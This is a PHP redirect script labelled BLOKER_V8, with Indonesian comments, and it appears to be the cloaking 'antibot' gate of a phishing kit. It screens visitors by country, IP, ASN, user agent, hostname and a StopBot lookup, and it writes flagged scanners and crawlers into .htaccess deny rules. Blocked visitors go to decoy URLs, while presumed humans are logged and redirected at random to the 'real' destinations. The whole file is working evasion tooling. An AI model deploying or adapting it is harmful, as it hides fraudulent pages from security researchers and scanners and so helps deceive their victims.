<?php
// Main Redirect Handler - BLOKER_V8

// === FUNGSI DASAR ===
if (!function_exists('getRealIP')) {
    function getRealIP() {
        return $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'];
    }
}

if (!function_exists('getIpInfo')) {
    function getIpInfo($ip) {
        $json = @file_get_contents("https://ipinfo.io/{$ip}/json");
        return json_decode($json, true) ?? [];
    }
}

if (!function_exists('getASN')) {
    function getASN($ip) {
        $json = @file_get_contents("https://ipinfo.io/{$ip}/json");
        $data = json_decode($json, true);
        return $data['asn'] ?? 'UNKNOWN';
    }
}

if (!function_exists('fetchHostname')) {
    function fetchHostname($ip) {
        return gethostbyaddr($ip);
    }
}

if (!function_exists('getAgentDetails')) {
    function getAgentDetails() {
        $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
        return preg_match('/\(([^)]+)\)/', $ua, $m) ? $m[1] : $ua;
    }
}

if (!function_exists('readLines')) {
    function readLines($file) {
        return file_exists($file) ? array_map('trim', file($file)) : [];
    }
}

if (!function_exists('logData')) {
    function logData($file, $data) {
        file_put_contents("log/$file", date("Y-m-d H:i:s") . " | $data\n", FILE_APPEND);
    }
}

if (!function_exists('appendToHtaccess')) {
    function appendToHtaccess($ip = null, $ua = null) {
        $ht = file_exists('.htaccess') ? file_get_contents('.htaccess') : '';
        if ($ip && strpos($ht, "Deny from $ip") === false) {
            file_put_contents('.htaccess', "\nDeny from $ip", FILE_APPEND);
        }
        if ($ua && !preg_match("/SetEnvIfNoCase User-Agent \"$ua\"/", $ht)) {
            file_put_contents('.htaccess', "\nSetEnvIfNoCase User-Agent \"$ua\" bad_bot", FILE_APPEND);
        }
    }
}

if (!function_exists('trimHtaccess')) {
    function trimHtaccess($maxLines = 1000) {
        $file = '.htaccess';
        if (!file_exists($file)) return;
        $lines = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if (count($lines) <= $maxLines) return;

        $essential = array_filter($lines, fn($l) =>
            stripos($l, 'Limit') !== false ||
            stripos($l, 'Order') !== false ||
            stripos($l, 'Allow') !== false
        );

        $denyLines = array_filter($lines, fn($l) =>
            stripos($l, 'Deny from') !== false || stripos($l, 'SetEnvIfNoCase') !== false
        );

        $recent = array_slice($denyLines, -($maxLines - count($essential)));
        file_put_contents($file, implode("\n", array_merge($essential, $recent)));
    }
}

if (!function_exists('checkStopBot')) {
    function checkStopBot($ip, $apikey) {
        $url = "https://stopbot.com/api/check?ip=" . urlencode($ip) . "&key=" . urlencode($apikey);
        $response = @file_get_contents($url);
        $data = json_decode($response, true);
        if (isset($data['is_bot']) && $data['is_bot'] === true) {
            appendToHtaccess($ip);
            return true;
        }
        return false;
    }
}

// === VARIABEL & KONFIGURASI ===
$ip      = getRealIP();
$ipInfo  = getIpInfo($ip);
$asn     = $ipInfo['asn'] ?? 'UNKNOWN';
$country = $ipInfo['country'] ?? 'UNKNOWN';
$host    = fetchHostname($ip);
$ua      = $_SERVER['HTTP_USER_AGENT'] ?? '';
$agent   = getAgentDetails();
$config  = json_decode(file_get_contents("config.json"), true);
$reason  = false;

// === PEMERIKSAAN BLOKIR ===
if ($config['block']['country'] && !empty($config['allowed_countries'])) {
    $allowed = array_map('trim', explode(',', $config['allowed_countries']));
    if (!in_array($country, $allowed)) {
        $reason = "Country Blocked";
    }
}

if (!$reason && $config['block']['ip'] && in_array($ip, readLines("blacklist/Ip_Blacklist.dat")))
    $reason = "IP Blocked";

if (!$reason && $config['block']['asn']) {
    foreach (readLines("blacklist/ASN.dat") as $a) {
        if (stripos($asn, $a) !== false) {
            $reason = "ASN Blocked";
            break;
        }
    }
}

if (!$reason && $config['block']['ua']) {
    foreach (readLines("blacklist/UA.dat") as $u) {
        if (stripos($ua, $u) !== false) {
            $reason = "UA Blocked";
            break;
        }
    }
}

if (!$reason && $config['block']['host']) {
    foreach (readLines("blacklist/hostname.dat") as $h) {
        if (stripos($host, $h) !== false) {
            $reason = "Host Blocked";
            break;
        }
    }
}

if (!$reason && $config['block']['stopbot'] && checkStopBot($ip, $config['stopbot_api_key'])) {
    $reason = "StopBot Blocked";
}

if ($reason) {
    $urls   = readLines("rotator/block.txt");
    $target = $urls[array_rand($urls)] ?? "https://blocked.example.com";
    appendToHtaccess($ip, $ua);
    trimHtaccess();
    logData("blocked.txt", "$ip | $host | $agent | $reason → $target");
    logData("status.txt", "$ip|$host|$agent|Blocked|$reason|$target");
    header("Location: $target");
    exit;
}

$urls   = readLines("rotator/real.txt");
$target = $urls[array_rand($urls)] ?? "https://default.example.com";
logData("visitors.txt", "$ip | $host | $agent → $target");
logData("status.txt", "$ip|$host|$agent|Human|OK|$target");
header("Location: $target");
exit;
